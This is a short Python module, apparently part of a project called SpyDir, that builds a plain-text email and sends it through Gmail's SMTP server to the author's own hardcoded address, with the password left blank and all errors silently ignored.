import smtplib
from email.mime.text import MIMEText

USERNAME = 'spydir1209'
ADDRESS = 'spydir1209@gmail.com'
PASSWORD = ''  # Fill email pwd here
SUBJECT = 'SpyDir'


def create_mail(message):
    msg = MIMEText(message)
    msg['Subject'] = SUBJECT
    msg['From'] = ADDRESS
    msg['To'] = ADDRESS
    msg = msg.as_string()
    return msg


def send_email(message):
    try:
        msg = create_mail(message)  # Create SMTP body
        if not msg:
            return
        # Send through SMTP Gmail server
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)  # Connect SMTP Server
        server.ehlo()
        server.login(USERNAME, PASSWORD)
        server.sendmail(ADDRESS, ADDRESS, msg)
        server.close()
    except:
        pass
